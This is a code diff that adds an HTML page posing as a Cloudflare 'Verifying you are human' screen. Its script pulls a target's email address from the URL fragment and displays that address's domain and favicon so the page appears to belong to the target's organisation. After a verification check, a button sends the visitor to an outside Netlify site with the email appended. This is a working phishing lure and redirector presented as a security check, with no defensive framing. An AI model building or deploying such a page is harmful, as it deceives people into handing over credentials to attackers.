@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <title>Just a moment...</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="icon" id="favicon" href="favicon.ico">
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <style>
+    body{font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;margin:0;display:flex;flex-direction:column;height:100vh}
+    .main-wrapper{flex:1;display:flex;align-items:center;justify-content:flex-start}
+    .main-content{margin:6rem auto;max-width:60rem;padding-left:1.5rem}
+    .zone-name-title{display:flex;align-items:center;gap:.5rem;font-size:1.875rem;font-weight:500}
+    .zone-name-title img{width:20px;height:20px}
+    .h2{font-size:1.5rem;font-weight:500;line-height:2.25rem;margin:1rem 0}
+    .core-msg{font-size:1rem;color:#333;margin-top:2.2rem}
+    .footer{margin-top:auto;padding:1rem;text-align:center;font-size:.7rem;color:#777}
+    #continue-button{margin-top:1.5rem;padding:.6rem 1.5rem;font-size:1rem;border:none;background:#007bff;color:#fff;border-radius:6px;cursor:pointer;display:none}
+  </style>
+</head>
+<body>
+  <div class="main-wrapper" role="main">
+    <div class="main-content">
+      <h1 class="zone-name-title">
+        <img id="domain-icon" src="favicon.ico" alt="icon">
+        <span id="domain-name">www.example.com</span>
+      </h1>
+
+      <p class="h2">Verifying you are human. This may take a few seconds.</p>
+
+      <div id="challenge-area">
+        <div class="cf-turnstile"
+             data-sitekey="0x4AAAAAAB_eoo3l25cWwEFf"
+             data-theme="auto"
+             data-callback="onCaptchaSuccess">
+        </div>
+
+        <button id="continue-button" type="button">Click to Continue</button>
+      </div>
+
+      <div class="core-msg">
+        <span id="domain-message">www.example.com</span> needs to review the security of your connection before proceeding.
+      </div>
+
+      <div id="challenge-success-text" class="h2" style="display:none">Verification successful</div>
+    </div>
+  </div>
+
+  <div class="footer" role="contentinfo">
+    <div class="ray-id">Ray ID: <code>9544de77e80d517e</code></div>
+    <div>Performance &amp; security by <a href="https://www.cloudflare.com/" target="_blank" rel="noopener noreferrer">Cloudflare</a></div>
+  </div>
+
+<script>
+(function () {
+  // Helpers
+  function stripLeadingHashes(s){ return s.replace(/^#+/,''); }
+  function stripTrailingHashes(s){ return s.replace(/#+$/,''); }
+  function capitalizeFirst(s){
+    if(!s) return s;
+    return s.charAt(0).toUpperCase() + s.slice(1);
+  }
+
+  // get raw hash (without leading #)
+  const rawHash = (window.location.hash || '').substring(1); // no leading #
+  // if example: rawHash = "hfkutjyt@x.com"
+
+  // Extract domain from email hash (if present)
+  let domainText = 'www.example.com';
+  if (rawHash && rawHash.includes('@')) {
+    const parts = rawHash.split('@');
+    const domain = parts[1] || '';
+    domainText = domain ? capitalizeFirst(domain) : domainText;
+
+    // try favicons
+    const googleFavicon = 'https://www.google.com/s2/favicons?domain=' + domain;
+    const duckFavicon   = 'https://icons.duckduckgo.com/ip3/' + domain + '.ico';
+
+    const iconEl = document.getElementById('domain-icon');
+    const faviconLink = document.getElementById('favicon');
+
+    // set google first, fallback to duckduckgo
+    iconEl.src = googleFavicon;
+    if (faviconLink) faviconLink.href = googleFavicon;
+    iconEl.onerror = function(){
+      this.onerror = null;
+      this.src = duckFavicon;
+      if (faviconLink) faviconLink.href = duckFavicon;
+    };
+
+    // set visible text + tab title
+    document.getElementById('domain-name').textContent = domainText;
+    document.getElementById('domain-message').textContent = domainText;
+    document.title = domainText + ' | Just a moment...';
+  }
+
+  // Continue button redirect behavior
+  // IMPORTANT: make sure insideBase is your inner page base (without any hash or with or without trailing # - code handles it)
+  const insideBase = 'https://whimsical-pavlova-842f26.netlify.app';
+
+  // Called by Turnstile when human verified
+  window.onCaptchaSuccess = function(token) {
+    // show success and reveal continue button
+    document.getElementById('challenge-success-text').style.display = 'block';
+    const btn = document.getElementById('continue-button');
+    btn.style.display = 'inline-block';
+
+    btn.onclick = function(){
+      // ensure only one '#'
+      const cleanBase = stripTrailingHashes(insideBase);
+      const cleanHash = stripLeadingHashes(rawHash || '');
+      const final = cleanHash ? (cleanBase + '#' + cleanHash) : cleanBase;
+      // debug: console.log('Redirecting to:', final);
+      window.location.href = final;
+    };
+  };
+})();
+</script>
+</body>
+</html>
